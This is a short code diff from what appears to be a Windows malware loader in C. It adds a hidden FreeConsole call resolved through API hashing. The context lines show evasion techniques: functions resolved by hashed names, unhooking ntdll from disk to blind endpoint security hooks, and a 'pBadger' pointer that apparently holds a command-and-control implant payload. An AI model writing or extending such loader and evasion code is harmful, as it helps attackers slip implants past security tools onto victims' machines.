@@ -12,7 +12,12 @@
 
 BOOL Run()
 {
-
+	HMODULE hKernel32Base = GetModuleHandleH(0x377D97D5);
+	fnFreeConsole pFreeConsole = (fnFreeConsole)GetProcAddressH(hKernel32Base, 0x4DEB7485);
+	if (pFreeConsole) {
+		pFreeConsole();
+	}
+	
 	HMODULE hNtdllBase = GetModuleHandleH(0x1C8BDEBA);
 	if (!UnhookNtdllFromDisk(hNtdllBase)) {
 		return FALSE;
@@ -37,7 +42,6 @@ BOOL Run()
 		return FALSE;
 	}
 
-	HMODULE hKernel32Base = GetModuleHandleH(0x377D97D5);
 	fnGetCurrentProcess pGetCurrentProcess = (fnGetCurrentProcess)GetProcAddressH(hKernel32Base, 0x36A1243A);
 
 	PVOID pBadger = NULL;
